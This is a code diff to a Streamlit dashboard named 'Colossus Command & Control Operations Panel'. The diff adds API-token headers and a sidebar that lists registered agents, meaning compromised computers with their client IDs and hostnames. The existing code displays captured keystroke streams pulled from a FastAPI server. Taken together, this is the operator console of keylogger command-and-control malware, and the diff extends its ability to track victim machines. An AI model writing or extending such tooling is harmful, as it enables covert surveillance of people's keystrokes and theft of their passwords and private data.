@@ -1,15 +1,20 @@
+import os
 import streamlit as st
 import httpx
 import pandas as pd
 from datetime import datetime
+from dotenv import load_dotenv
 
 # Setup and Configuration
 st.set_page_config(
     page_title="Colossus C2 Console",
     layout="wide",
 )
+load_dotenv()
 
+API_TOKEN = os.getenv("ARGUS_API_TOKEN", "")
 SERVER_URL = "http://127.0.0.1:8000"
+GLOBAL_HEADERS = {"X-Argus-Token": API_TOKEN}
 
 st.title("Colossus Command & Control Operations Panel")
 st.markdown("---")
@@ -19,7 +24,27 @@ st.markdown("---")
 def get_telemetry_logs():
     """Queries the FastAPI server for active decrypted keystroke streams."""
     try:
-        response = httpx.get(f"{SERVER_URL}/api/v1/dashboard/logs", timeout=5.0)
+        response = httpx.get(
+            f"{SERVER_URL}/api/v1/dashboard/logs", headers=GLOBAL_HEADERS, timeout=5.0
+        )
+        if response.status_code == 200:
+            return response.json()
+        else:
+            st.error(f"Server returned an error profile: Status {response.status_code}")
+            return []
+    except httpx.ConnectError:
+        st.error(
+            "Unable to connect to the Colossus FastAPI server. Is it running on port 8000?"
+        )
+        return []
+
+
+def get_registered_agents():
+    """Queries the FastAPI server for a list of all computers that are logged on the database."""
+    try:
+        response = httpx.get(
+            f"{SERVER_URL}/api/v1/dashboard/agents", headers=GLOBAL_HEADERS, timeout=5.0
+        )
         if response.status_code == 200:
             return response.json()
         else:
@@ -82,3 +107,15 @@ else:
                 st.markdown("**Captured Keystrokes:**")
                 # Render content in a code block window to make it stand out
                 st.code(row["encrypted_data"], language="text")
+
+
+st.sidebar.markdown("Rgistered Agents")
+agents_list = get_registered_agents()
+
+if not agents_list:
+    st.sidebar.caption("No active agents footprints cataloged yet.")
+else:
+    for agent in agents_list:
+        st.sidebar.markdown(
+            f"**ID** '{agent['client_id']}' *(Host: {agent['hostname']}*"
+        )
